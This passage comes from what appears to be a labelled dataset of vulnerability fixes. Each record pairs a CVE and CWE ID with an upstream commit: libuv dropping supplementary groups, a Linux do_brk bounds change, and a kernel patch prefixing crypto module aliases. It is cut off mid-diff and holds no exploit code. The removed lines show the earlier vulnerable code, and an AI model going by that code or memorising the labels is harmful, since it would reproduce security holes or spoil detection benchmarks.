\/* When dropping privileges from root, the `setgroups` call will\n+     * remove any extraneous groups. If we don't call this, then\n+     * even though our uid has dropped, we may still have groups\n+     * that enable us to do super-user things. This will fail if we\n+     * aren't root, so don't bother checking the return value, this\n+     * is just done as an optimistic privilege dropping function.\n+     *\/\n+    SAVE_ERRNO(setgroups(0, NULL));\n+  }\n+\n   if ((options->flags & UV_PROCESS_SETGID) && setgid(options->gid)) {\n     uv__write_int(error_fd, -errno);\n     perror(\"setgid()\");\n","owner":"libuv","repo":"libuv","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"2c6a10161d0b5fc047b5bd81b03693b9af99fab5","commit_message":"From 2c6a10161d0b5fc047b5bd81b03693b9af99fab5 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Thu, 3 Dec 2009 19:40:46 -0500\nSubject: switch do_brk() to get_unmapped_area()\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n mm\/mmap.c | 10 ++--------\n 1 file changed, 2 insertions(+), 8 deletions(-)\n\n","diff_code":"diff --git a\/mm\/mmap.c b\/mm\/mmap.c\nindex c04146da8efd..ed70a68e882a 100644\n--- a\/mm\/mmap.c\n+++ b\/mm\/mmap.c\n@@ -1985,20 +1985,14 @@ unsigned long do_brk(unsigned long addr, unsigned long len)\n \tif (!len)\n \t\treturn addr;\n \n-\tif ((addr + len) > TASK_SIZE || (addr + len) < addr)\n-\t\treturn -EINVAL;\n-\n-\tif (is_hugepage_only_range(mm, addr, len))\n-\t\treturn -EINVAL;\n-\n \terror = security_file_mmap(NULL, 0, 0, 0, addr, 1);\n \tif (error)\n \t\treturn error;\n \n \tflags = VM_DATA_DEFAULT_FLAGS | VM_ACCOUNT | mm->def_flags;\n \n-\terror = arch_mmap_check(addr, len, flags);\n-\tif (error)\n+\terror = get_unmapped_area(NULL, addr, len, 0, MAP_FIXED);\n+\tif (error & ~PAGE_MASK)\n \t\treturn error;\n \n \t\/*\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-7421","CWE_ID":"264","category":"security","commit_id":"5d26a105b5a73e5635eae0629b42fa0a90e07b7b","commit_message":"From 5d26a105b5a73e5635eae0629b42fa0a90e07b7b Mon Sep 17 00:00:00 2001\nFrom: Kees Cook <keescook@chromium.org>\nDate: Thu, 20 Nov 2014 17:05:53 -0800\nSubject: [PATCH] crypto: prefix module autoloading with \"crypto-\"\n\nThis prefixes all crypto module loading with \"crypto-\" so we never run\nthe risk of exposing module auto-loading to userspace via a crypto API,\nas demonstrated by Mathias Krause:\n\nhttps:\/\/lkml.org\/lkml\/2013\/3\/4\/70\n\nSigned-off-by: Kees Cook <keescook@chromium.org>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>\n---\n arch\/arm\/crypto\/aes_glue.c                  |  4 ++--\n arch\/arm\/crypto\/sha1_glue.c                 |  2 +-\n arch\/arm\/crypto\/sha1_neon_glue.c            |  2 +-\n arch\/arm\/crypto\/sha512_neon_glue.c          |  4 ++--\n arch\/arm64\/crypto\/aes-ce-ccm-glue.c         |  2 +-\n arch\/arm64\/crypto\/aes-glue.c                |  8 ++++----\n arch\/powerpc\/crypto\/sha1.c                  |  2 +-\n arch\/s390\/crypto\/aes_s390.c                 |  2 +-\n arch\/s390\/crypto\/des_s390.c                 |  4 ++--\n arch\/s390\/crypto\/ghash_s390.c               |  2 +-\n arch\/s390\/crypto\/sha1_s390.c                |  2 +-\n arch\/s390\/crypto\/sha256_s390.c              |  4 ++--\n arch\/s390\/crypto\/sha512_s390.c              |  4 ++--\n arch\/sparc\/crypto\/aes_glue.c                |  2 +-\n arch\/sparc\/crypto\/camellia_glue.c           |  2 +-\n arch\/sparc\/crypto\/crc32c_glue.c             |  2 +-\n arch\/sparc\/crypto\/des_glue.c                |  2 +-\n arch\/sparc\/crypto\/md5_glue.c                |  2 +-\n arch\/sparc\/crypto\/sha1_glue.c               |  2 +-\n arch\/sparc\/crypto\/sha256_glue.c             |  4 ++--\n arch\/sparc\/crypto\/sha512_glue.c             |  4 ++--\n arch\/x86\/crypto\/aes_glue.c                  |  4 ++--\n arch\/x86\/crypto\/aesni-intel_glue.c          |  2 +-\n arch\/x86\/crypto\/blowfish_glue.c             |  4 ++--\n arch\/x86\/crypto\/camellia_aesni_avx2_glue.c  |  4 ++--\n arch\/x86\/crypto\/camellia_aesni_avx_glue.c   |  4 ++--\n arch\/x86\/crypto\/camellia_glue.c             |  4 ++--\n arch\/x86\/crypto\/cast5_avx_glue.c            |  2 +-\n arch\/x86\/crypto\/cast6_avx_glue.c            |  2 +-\n arch\/x86\/crypto\/crc32-pclmul_glue.c         |  4 ++--\n arch\/x86\/crypto\/crc32c-intel_glue.c         |  4 ++--\n arch\/x86\/crypto\/crct10dif-pclmul_glue.c     |  4 ++--\n arch\/x86\/crypto\/des3_ede_glue.c             |  8 ++++----\n arch\/x86\/crypto\/ghash-clmulni-intel_glue.c  |  2 +-\n arch\/x86\/crypto\/salsa20_glue.c              |  4 ++--\n arch\/x86\/crypto\/serpent_avx2_glue.c         |  4 ++--\n arch\/x86\/crypto\/serpent_avx_glue.c          |  2 +-\n arch\/x86\/crypto\/serpent_sse2_glue.c         |  2 +-\n arch\/x86\/crypto\/sha1_ssse3_glue.c           |  2 +-\n arch\/x86\/crypto\/sha256_ssse3_glue.c         |  4 ++--\n arch\/x86\/crypto\/sha512_ssse3_glue.c         |  4 ++--\n arch\/x86\/crypto\/twofish_avx_glue.c          |  2 +-\n arch\/x86\/crypto\/twofish_glue.c              |  4 ++--\n arch\/x86\/crypto\/twofish_glue_3way.c         |  4 ++--\n crypto\/842.c                                |  1 +\n crypto\/aes_generic.c                        |  2 +-\n crypto\/ansi_cprng.c                         |  2 +-\n crypto\/anubis.c                             |  1 +\n crypto\/api.c                                |  4 ++--\n crypto\/arc4.c                               |  1 +\n crypto\/blowfish_generic.c                   |  2 +-\n crypto\/camellia_generic.c                   |  2 +-\n crypto\/cast5_generic.c                      |  2 +-\n crypto\/cast6_generic.c                      |  2 +-\n crypto\/ccm.c                                |  4 ++--\n crypto\/crc32.c                              |  1 +\n crypto\/crc32c_generic.c                     |  2 +-\n crypto\/crct10dif_generic.c                  |  2 +-\n crypto\/crypto_null.c                        |  6 +++---\n crypto\/ctr.c                                |  2 +-\n crypto\/deflate.c                            |  2 +-\n crypto\/des_generic.c                        |  2 +-\n crypto\/fcrypt.c                             |  1 +\n crypto\/gcm.c                                |  6 +++---\n crypto\/ghash-generic.c                      |  2 +-\n crypto\/khazad.c                             |  1 +\n crypto\/krng.c                               |  2 +-\n crypto\/lz4.c                                |  1 +\n crypto\/lz4hc.c                              |  1 +\n crypto\/lzo.c                                |  1 +\n crypto\/md4.c                                |  2 +-\n crypto\/md5.c                                |  1 +\n crypto\/michael_mic.c                        |  1 +\n crypto\/rmd128.c                             |  1 +\n crypto\/rmd160.c                             |  1 +\n crypto\/rmd256.c                             |  1 +\n crypto\/rmd320.c                             |  1 +\n crypto\/salsa20_generic.c                    |  2 +-\n crypto\/seed.c                               |  1 +\n crypto\/serpent_generic.c                    |  4 ++--\n crypto\/sha1_generic.c                       |  2 +-\n crypto\/sha256_generic.c                     |  4 ++--\n crypto\/sha512_generic.c                     |  4 ++--\n crypto\/tea.c                                |  4 ++--\n crypto\/tgr192.c                             |  4 ++--\n crypto\/twofish_generic.c                    |  2 +-\n crypto\/wp512.c                              |  4 ++--\n crypto\/zlib.c                               |  1 +\n drivers\/crypto\/padlock-aes.c                |  2 +-\n drivers\/crypto\/padlock-sha.c                |  8 ++++----\n drivers\/crypto\/qat\/qat_common\/adf_ctl_drv.c |  3 ++-\n drivers\/crypto\/ux500\/cryp\/cryp_core.c       |  4 ++--\n drivers\/crypto\/ux500\/hash\/hash_core.c       |  8 ++++----\n drivers\/s390\/crypto\/ap_bus.c                |  3 ++-\n include\/linux\/crypto.h                      | 13 +++++++++++++\n 95 files changed, 155 insertions(+), 123 deletions(-)\n\n","diff_code":"diff --git a\/arch\/arm\/crypto\/aes_glue.c b\/arch\/arm\/crypto\/aes_glue.c\nindex 3003fa1f6fb4b..0409b8f897823 100644\n--- a\/arch\/arm\/crypto\/aes_glue.c\n+++ b\/arch\/arm\/crypto\/aes_glue.c\n@@ -93,6 +93,6 @@ module_exit(aes_fini);\n \n MODULE_DESCRIPTION(\"Rijndael (AES) Cipher Algorithm (ASM)\");\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"aes\");\n-MODULE_ALIAS(\"aes-asm\");\n+MODULE_ALIAS_CRYPTO(\"aes\");\n+MODULE_ALIAS_CRYPTO(\"aes-asm\");\n MODULE_AUTHOR(\"David McCullough <ucdevel@gmail.com>\");\ndiff --git a\/arch\/arm\/crypto\/sha1_glue.c b\/arch\/arm\/crypto\/sha1_glue.c\nindex 84f2a756588be..e31b0440c6139 100644\n--- a\/arch\/arm\/crypto\/sha1_glue.c\n+++ b\/arch\/arm\/crypto\/sha1_glue.c\n@@ -171,5 +171,5 @@ module_exit(sha1_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA1 Secure Hash Algorithm (ARM)\");\n-MODULE_ALIAS(\"sha1\");\n+MODULE_ALIAS_CRYPTO(\"sha1\");\n MODULE_AUTHOR(\"David McCullough <ucdevel@gmail.com>\");\ndiff --git a\/arch\/arm\/crypto\/sha1_neon_glue.c b\/arch\/arm\/crypto\/sha1_neon_glue.c\nindex 6f1b411b1d554..0b0083757d477 100644\n--- a\/arch\/arm\/crypto\/sha1_neon_glue.c\n+++ b\/arch\/arm\/crypto\/sha1_neon_glue.c\n@@ -194,4 +194,4 @@ module_exit(sha1_neon_mod_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA1 Secure Hash Algorithm, NEON accelerated\");\n-MODULE_ALIAS(\"sha1\");\n+MODULE_ALIAS_CRYPTO(\"sha1\");\ndiff --git a\/arch\/arm\/crypto\/sha512_neon_glue.c b\/arch\/arm\/crypto\/sha512_neon_glue.c\nindex 0d2758ff5e12e..f3452c66059d5 100644\n--- a\/arch\/arm\/crypto\/sha512_neon_glue.c\n+++ b\/arch\/arm\/crypto\/sha512_neon_glue.c\n@@ -301,5 +301,5 @@ module_exit(sha512_neon_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA512 Secure Hash Algorithm, NEON accelerated\");\n \n-MODULE_ALIAS(\"sha512\");\n-MODULE_ALIAS(\"sha384\");\n+MODULE_ALIAS_CRYPTO(\"sha512\");\n+MODULE_ALIAS_CRYPTO(\"sha384\");\ndiff --git a\/arch\/arm64\/crypto\/aes-ce-ccm-glue.c b\/arch\/arm64\/crypto\/aes-ce-ccm-glue.c\nindex 9e6cdde9b43d9..0156a268e163f 100644\n--- a\/arch\/arm64\/crypto\/aes-ce-ccm-glue.c\n+++ b\/arch\/arm64\/crypto\/aes-ce-ccm-glue.c\n@@ -294,4 +294,4 @@ module_exit(aes_mod_exit);\n MODULE_DESCRIPTION(\"Synchronous AES in CCM mode using ARMv8 Crypto Extensions\");\n MODULE_AUTHOR(\"Ard Biesheuvel <ard.biesheuvel@linaro.org>\");\n MODULE_LICENSE(\"GPL v2\");\n-MODULE_ALIAS(\"ccm(aes)\");\n+MODULE_ALIAS_CRYPTO(\"ccm(aes)\");\ndiff --git a\/arch\/arm64\/crypto\/aes-glue.c b\/arch\/arm64\/crypto\/aes-glue.c\nindex 79cd911ef88c3..5f63a791b2fb5 100644\n--- a\/arch\/arm64\/crypto\/aes-glue.c\n+++ b\/arch\/arm64\/crypto\/aes-glue.c\n@@ -38,10 +38,10 @@ MODULE_DESCRIPTION(\"AES-ECB\/CBC\/CTR\/XTS using ARMv8 Crypto Extensions\");\n #define aes_xts_encrypt\t\tneon_aes_xts_encrypt\n #define aes_xts_decrypt\t\tneon_aes_xts_decrypt\n MODULE_DESCRIPTION(\"AES-ECB\/CBC\/CTR\/XTS using ARMv8 NEON\");\n-MODULE_ALIAS(\"ecb(aes)\");\n-MODULE_ALIAS(\"cbc(aes)\");\n-MODULE_ALIAS(\"ctr(aes)\");\n-MODULE_ALIAS(\"xts(aes)\");\n+MODULE_ALIAS_CRYPTO(\"ecb(aes)\");\n+MODULE_ALIAS_CRYPTO(\"cbc(aes)\");\n+MODULE_ALIAS_CRYPTO(\"ctr(aes)\");\n+MODULE_ALIAS_CRYPTO(\"xts(aes)\");\n #endif\n \n MODULE_AUTHOR(\"Ard Biesheuvel <ard.biesheuvel@linaro.org>\");\ndiff --git a\/arch\/powerpc\/crypto\/sha1.c b\/arch\/powerpc\/crypto\/sha1.c\nindex f9e8b9491efc2..0f88c7b411196 100644\n--- a\/arch\/powerpc\/crypto\/sha1.c\n+++ b\/arch\/powerpc\/crypto\/sha1.c\n@@ -154,4 +154,4 @@ module_exit(sha1_powerpc_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA1 Secure Hash Algorithm\");\n \n-MODULE_ALIAS(\"sha1-powerpc\");\n+MODULE_ALIAS_CRYPTO(\"sha1-powerpc\");\ndiff --git a\/arch\/s390\/crypto\/aes_s390.c b\/arch\/s390\/crypto\/aes_s390.c\nindex 23223cd63e548..1f272b24fc0bf 100644\n--- a\/arch\/s390\/crypto\/aes_s390.c\n+++ b\/arch\/s390\/crypto\/aes_s390.c\n@@ -979,7 +979,7 @@ static void __exit aes_s390_fini(void)\n module_init(aes_s390_init);\n module_exit(aes_s390_fini);\n \n-MODULE_ALIAS(\"aes-all\");\n+MODULE_ALIAS_CRYPTO(\"aes-all\");\n \n MODULE_DESCRIPTION(\"Rijndael (AES) Cipher Algorithm\");\n MODULE_LICENSE(\"GPL\");\ndiff --git a\/arch\/s390\/crypto\/des_s390.c b\/arch\/s390\/crypto\/des_s390.c\nindex 7acb77f7ef1ad..9e05cc453a40d 100644\n--- a\/arch\/s390\/crypto\/des_s390.c\n+++ b\/arch\/s390\/crypto\/des_s390.c\n@@ -619,8 +619,8 @@ static void __exit des_s390_exit(void)\n module_init(des_s390_init);\n module_exit(des_s390_exit);\n \n-MODULE_ALIAS(\"des\");\n-MODULE_ALIAS(\"des3_ede\");\n+MODULE_ALIAS_CRYPTO(\"des\");\n+MODULE_ALIAS_CRYPTO(\"des3_ede\");\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"DES & Triple DES EDE Cipher Algorithms\");\ndiff --git a\/arch\/s390\/crypto\/ghash_s390.c b\/arch\/s390\/crypto\/ghash_s390.c\nindex d43485d142e91..7940dc90e80bc 100644\n--- a\/arch\/s390\/crypto\/ghash_s390.c\n+++ b\/arch\/s390\/crypto\/ghash_s390.c\n@@ -160,7 +160,7 @@ static void __exit ghash_mod_exit(void)\n module_init(ghash_mod_init);\n module_exit(ghash_mod_exit);\n \n-MODULE_ALIAS(\"ghash\");\n+MODULE_ALIAS_CRYPTO(\"ghash\");\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"GHASH Message Digest Algorithm, s390 implementation\");\ndiff --git a\/arch\/s390\/crypto\/sha1_s390.c b\/arch\/s390\/crypto\/sha1_s390.c\nindex a1b3a9dc9d8a0..5b2bee323694b 100644\n--- a\/arch\/s390\/crypto\/sha1_s390.c\n+++ b\/arch\/s390\/crypto\/sha1_s390.c\n@@ -103,6 +103,6 @@ static void __exit sha1_s390_fini(void)\n module_init(sha1_s390_init);\n module_exit(sha1_s390_fini);\n \n-MODULE_ALIAS(\"sha1\");\n+MODULE_ALIAS_CRYPTO(\"sha1\");\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA1 Secure Hash Algorithm\");\ndiff --git a\/arch\/s390\/crypto\/sha256_s390.c b\/arch\/s390\/crypto\/sha256_s390.c\nindex 9b853809a492b..b74ff158108c9 100644\n--- a\/arch\/s390\/crypto\/sha256_s390.c\n+++ b\/arch\/s390\/crypto\/sha256_s390.c\n@@ -143,7 +143,7 @@ static void __exit sha256_s390_fini(void)\n module_init(sha256_s390_init);\n module_exit(sha256_s390_fini);\n \n-MODULE_ALIAS(\"sha256\");\n-MODULE_ALIAS(\"sha224\");\n+MODULE_ALIAS_CRYPTO(\"sha256\");\n+MODULE_ALIAS_CRYPTO(\"sha224\");\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA256 and SHA224 Secure Hash Algorithm\");\ndiff --git a\/arch\/s390\/crypto\/sha512_s390.c b\/arch\/s390\/crypto\/sha512_s390.c\nindex 32a81383b69c1..0c36989ba182b 100644\n--- a\/arch\/s390\/crypto\/sha512_s390.c\n+++ b\/arch\/s390\/crypto\/sha512_s390.c\n@@ -86,7 +86,7 @@ static struct shash_alg sha512_alg = {\n \t}\n };\n \n-MODULE_ALIAS(\"sha512\");\n+MODULE_ALIAS_CRYPTO(\"sha512\");\n \n static int sha384_init(struct shash_desc *desc)\n {\n@@ -126,7 +126,7 @@ static struct shash_alg sha384_alg = {\n \t}\n };\n \n-MODULE_ALIAS(\"sha384\");\n+MODULE_ALIAS_CRYPTO(\"sha384\");\n \n static int __init init(void)\n {\ndiff --git a\/arch\/sparc\/crypto\/aes_glue.c b\/arch\/sparc\/crypto\/aes_glue.c\nindex df922f52d76dd..705408766ab0c 100644\n--- a\/arch\/sparc\/crypto\/aes_glue.c\n+++ b\/arch\/sparc\/crypto\/aes_glue.c\n@@ -499,6 +499,6 @@ module_exit(aes_sparc64_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"AES Secure Hash Algorithm, sparc64 aes opcode accelerated\");\n \n-MODULE_ALIAS(\"aes\");\n+MODULE_ALIAS_CRYPTO(\"aes\");\n \n #include \"crop_devid.c\"\ndiff --git a\/arch\/sparc\/crypto\/camellia_glue.c b\/arch\/sparc\/crypto\/camellia_glue.c\nindex 888f6260b4ec5..641f55cb61c3a 100644\n--- a\/arch\/sparc\/crypto\/camellia_glue.c\n+++ b\/arch\/sparc\/crypto\/camellia_glue.c\n@@ -322,6 +322,6 @@ module_exit(camellia_sparc64_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Camellia Cipher Algorithm, sparc64 camellia opcode accelerated\");\n \n-MODULE_ALIAS(\"aes\");\n+MODULE_ALIAS_CRYPTO(\"aes\");\n \n #include \"crop_devid.c\"\ndiff --git a\/arch\/sparc\/crypto\/crc32c_glue.c b\/arch\/sparc\/crypto\/crc32c_glue.c\nindex 5162fad912ce0..d1064e46efe8b 100644\n--- a\/arch\/sparc\/crypto\/crc32c_glue.c\n+++ b\/arch\/sparc\/crypto\/crc32c_glue.c\n@@ -176,6 +176,6 @@ module_exit(crc32c_sparc64_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"CRC32c (Castagnoli), sparc64 crc32c opcode accelerated\");\n \n-MODULE_ALIAS(\"crc32c\");\n+MODULE_ALIAS_CRYPTO(\"crc32c\");\n \n #include \"crop_devid.c\"\ndiff --git a\/arch\/sparc\/crypto\/des_glue.c b\/arch\/sparc\/crypto\/des_glue.c\nindex 3065bc61f9d3b..d115009729947 100644\n--- a\/arch\/sparc\/crypto\/des_glue.c\n+++ b\/arch\/sparc\/crypto\/des_glue.c\n@@ -532,6 +532,6 @@ module_exit(des_sparc64_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"DES & Triple DES EDE Cipher Algorithms, sparc64 des opcode accelerated\");\n \n-MODULE_ALIAS(\"des\");\n+MODULE_ALIAS_CRYPTO(\"des\");\n \n #include \"crop_devid.c\"\ndiff --git a\/arch\/sparc\/crypto\/md5_glue.c b\/arch\/sparc\/crypto\/md5_glue.c\nindex 09a9ea1dfb697..64c7ff5f72a9f 100644\n--- a\/arch\/sparc\/crypto\/md5_glue.c\n+++ b\/arch\/sparc\/crypto\/md5_glue.c\n@@ -185,6 +185,6 @@ module_exit(md5_sparc64_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"MD5 Secure Hash Algorithm, sparc64 md5 opcode accelerated\");\n \n-MODULE_ALIAS(\"md5\");\n+MODULE_ALIAS_CRYPTO(\"md5\");\n \n #include \"crop_devid.c\"\ndiff --git a\/arch\/sparc\/crypto\/sha1_glue.c b\/arch\/sparc\/crypto\/sha1_glue.c\nindex 6cd5f29e1e0d5..1b3e47accc746 100644\n--- a\/arch\/sparc\/crypto\/sha1_glue.c\n+++ b\/arch\/sparc\/crypto\/sha1_glue.c\n@@ -180,6 +180,6 @@ module_exit(sha1_sparc64_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA1 Secure Hash Algorithm, sparc64 sha1 opcode accelerated\");\n \n-MODULE_ALIAS(\"sha1\");\n+MODULE_ALIAS_CRYPTO(\"sha1\");\n \n #include \"crop_devid.c\"\ndiff --git a\/arch\/sparc\/crypto\/sha256_glue.c b\/arch\/sparc\/crypto\/sha256_glue.c\nindex 04f555ab26800..41f27cca2a225 100644\n--- a\/arch\/sparc\/crypto\/sha256_glue.c\n+++ b\/arch\/sparc\/crypto\/sha256_glue.c\n@@ -237,7 +237,7 @@ module_exit(sha256_sparc64_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA-224 and SHA-256 Secure Hash Algorithm, sparc64 sha256 opcode accelerated\");\n \n-MODULE_ALIAS(\"sha224\");\n-MODULE_ALIAS(\"sha256\");\n+MODULE_ALIAS_CRYPTO(\"sha224\");\n+MODULE_ALIAS_CRYPTO(\"sha256\");\n \n #include \"crop_devid.c\"\ndiff --git a\/arch\/sparc\/crypto\/sha512_glue.c b\/arch\/sparc\/crypto\/sha512_glue.c\nindex f04d1994d19aa..9fff88541b8c0 100644\n--- a\/arch\/sparc\/crypto\/sha512_glue.c\n+++ b\/arch\/sparc\/crypto\/sha512_glue.c\n@@ -222,7 +222,7 @@ module_exit(sha512_sparc64_mod_fini);\n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"SHA-384 and SHA-512 Secure Hash Algorithm, sparc64 sha512 opcode accelerated\");\n \n-MODULE_ALIAS(\"sha384\");\n-MODULE_ALIAS(\"sha512\");\n+MODULE_ALIAS_CRYPTO(\"sha384\");\n+MODULE_ALIAS_CRYPTO(\"sha512\");\n \n #include \"crop_devid.c\"\ndiff --git a\/arch\/x86\/crypto\/aes_glue.c b\/arch\/x86\/crypto\/aes_glue.c\nindex aafe8ce0d65dd..e26984f7ab8d2 100644\n--- a\/arch\/x86\/crypto\/aes_glue.c\n+++ b\/arch\/x86\/crypto\/aes_glue.c\n@@ -66,5 +66,5 @@ module_exit(aes_fini);\n \n MODULE_DESCRIPTION(\"Rijndael (AES) Cipher Algorithm, asm optimized\");\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"aes\");\n-MODULE_ALIAS(\"aes-asm\");\n+MODULE_ALIAS_CRYPTO(\"aes\");\n+MODULE_ALIAS_CRYPTO(\"aes-asm\");\ndiff --git a\/arch\/x86\/crypto\/aesni-intel_glue.c b\/arch\/x86\/crypto\/aesni-intel_glue.c\nindex bcebf754466cd..ae855f4f64b77 100644\n--- a\/arch\/x86\/crypto\/aesni-intel_glue.c\n+++ b\/arch\/x86\/crypto\/aesni-intel_glue.c\n@@ -1546,4 +1546,4 @@ module_exit(aesni_exit);\n \n MODULE_DESCRIPTION(\"Rijndael (AES) Cipher Algorithm, Intel AES-NI instructions optimized\");\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"aes\");\n+MODULE_ALIAS_CRYPTO(\"aes\");\ndiff --git a\/arch\/x86\/crypto\/blowfish_glue.c b\/arch\/x86\/crypto\/blowfish_glue.c\nindex 8af519ed73d12..17c05531dfd17 100644\n--- a\/arch\/x86\/crypto\/blowfish_glue.c\n+++ b\/arch\/x86\/crypto\/blowfish_glue.c\n@@ -478,5 +478,5 @@ module_exit(fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Blowfish Cipher Algorithm, asm optimized\");\n-MODULE_ALIAS(\"blowfish\");\n-MODULE_ALIAS(\"blowfish-asm\");\n+MODULE_ALIAS_CRYPTO(\"blowfish\");\n+MODULE_ALIAS_CRYPTO(\"blowfish-asm\");\ndiff --git a\/arch\/x86\/crypto\/camellia_aesni_avx2_glue.c b\/arch\/x86\/crypto\/camellia_aesni_avx2_glue.c\nindex 4209a76fcdaad..9a07fafe38313 100644\n--- a\/arch\/x86\/crypto\/camellia_aesni_avx2_glue.c\n+++ b\/arch\/x86\/crypto\/camellia_aesni_avx2_glue.c\n@@ -582,5 +582,5 @@ module_exit(camellia_aesni_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Camellia Cipher Algorithm, AES-NI\/AVX2 optimized\");\n-MODULE_ALIAS(\"camellia\");\n-MODULE_ALIAS(\"camellia-asm\");\n+MODULE_ALIAS_CRYPTO(\"camellia\");\n+MODULE_ALIAS_CRYPTO(\"camellia-asm\");\ndiff --git a\/arch\/x86\/crypto\/camellia_aesni_avx_glue.c b\/arch\/x86\/crypto\/camellia_aesni_avx_glue.c\nindex 87a041a10f4ac..ed38d959add6a 100644\n--- a\/arch\/x86\/crypto\/camellia_aesni_avx_glue.c\n+++ b\/arch\/x86\/crypto\/camellia_aesni_avx_glue.c\n@@ -574,5 +574,5 @@ module_exit(camellia_aesni_fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Camellia Cipher Algorithm, AES-NI\/AVX optimized\");\n-MODULE_ALIAS(\"camellia\");\n-MODULE_ALIAS(\"camellia-asm\");\n+MODULE_ALIAS_CRYPTO(\"camellia\");\n+MODULE_ALIAS_CRYPTO(\"camellia-asm\");\ndiff --git a\/arch\/x86\/crypto\/camellia_glue.c b\/arch\/x86\/crypto\/camellia_glue.c\nindex c171dcbf192d9..5c8b6266a394b 100644\n--- a\/arch\/x86\/crypto\/camellia_glue.c\n+++ b\/arch\/x86\/crypto\/camellia_glue.c\n@@ -1725,5 +1725,5 @@ module_exit(fini);\n \n MODULE_LICENSE(\"GPL\");\n MODULE_DESCRIPTION(\"Camellia Cipher Algorithm, asm optimized\");\n-MODULE_ALIAS(\"camellia\");\n-MODULE_ALIAS(\"camellia-asm\");\n+MODULE_ALIAS_CRYPTO(\"camellia\");\n+MODULE_ALIAS_CRYPTO(\"camellia-asm\");\ndiff --git a\/arch\/x86\/crypto\/cast5_avx_glue.c b\/arch\/x86\/crypto\/cast5_avx_glue.c\nindex e57e20ab5e0bc..60ada677a9287 100644\n--- a\/arch\/x86\/crypto\/cast5_avx_glue.c\n+++ b\/arch\/x86\/crypto\/cast5_avx_glue.c\n@@ -491,4 +491,4 @@ module_exit(cast5_exit);\n \n MODULE_DESCRIPTION(\"Cast5 Cipher Algorithm, AVX optimized\");\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"cast5\");\n+MODULE_ALIAS_CRYPTO(\"cast5\");\ndiff --git a\/arch\/x86\/crypto\/cast6_avx_glue.c b\/arch\/x86\/crypto\/cast6_avx_glue.c\nindex 09f3677393e4b..0160f68a57ff3 100644\n--- a\/arch\/x86\/crypto\/cast6_avx_glue.c\n+++ b\/arch\/x86\/crypto\/cast6_avx_glue.c\n@@ -611,4 +611,4 @@ module_exit(cast6_exit);\n \n MODULE_DESCRIPTION(\"Cast6 Cipher Algorithm, AVX optimized\");\n MODULE_LICENSE(\"GPL\");\n-MODULE_ALIAS(\"cast6\");\n+MODULE_ALIAS_CRYPTO(\"cast6\");\ndiff --git a\/arch\/x86\/crypto\/crc32-pclmul_glue.c b\/arch\/x86\/crypto\/crc32-pclmul_glue.c\nindex 9d014a74ef969..1937fc1d87633 100644\n--- a\/arch\/x86\/crypto\/crc32-pclmul_glue.c\n+++ b\/arch\/x86\/crypto\/crc32-pclmul_glue.c\n@@ -197,5 +197,5 @@ module_exit(crc32_pclmul_mod_fini);\n MODULE_AUTHOR(\"Alexander Boyko <alexander_boyko@xyratex.com>\");\n MODULE_LICENSE(\"GPL\");\n \n-MODULE_ALIAS(\"crc32\");\n-MODULE_ALIAS(\"crc32-pclmul\");\n+MODULE_ALIAS_CRYPTO(\"crc32\");\n+MODULE_ALIAS_CRYPTO(\"crc32-pclmul\");\ndiff --git a\/arch\/x86\/crypto\/crc32c-intel_glue.c b\/arch\/x86\/crypto\/crc32c-intel_glue.c\nindex 6812ad98355c3..28640c3d6af7f 100644\n--- a\/arch\/x86\/crypto\/crc32c-intel_glue.c\n+++ b\/arch\/x86\/crypto\/crc32c-intel_glue.c\n@@ -280,5 +280,5 @@ MODULE_AUTHOR(\"Austin Zhang <austin.zhang@intel.com>, Kent Liu <kent.liu@intel.c\n MODULE_DESCRIPTION(\"CRC32c (Castagnoli) optimization using Intel Hardware.\");\n MODULE_LICENSE(\"GPL\");\n \n-MODULE_ALIAS(\"crc32c\");\n-MODULE_ALIAS(\"crc32c-intel\");\n+MODULE_ALIAS_CRYPTO(\"crc32c\");\n+MODULE_ALIAS_CRYPTO(\"crc32c-intel\");\ndiff --git a\/arch\/x86\/crypto\/crct10dif-pclmul_glue.c b\/arch\/x86\/crypto\/crct10dif-pclmul_glue.c\nindex 7845d7fd54c0a..b6c67bf30fdf6 100644\n--- a\/arch\/x86\/crypto\/crct10dif-pclmul_glue.c\n+++ b\/arch\/x86\/crypto\/crct10dif-pclmul_glue.c\n@@ -147,5 +147,5 @@ MODULE_AUTHOR(\"Tim Chen <tim.c.chen@linux.intel.com>\");\n 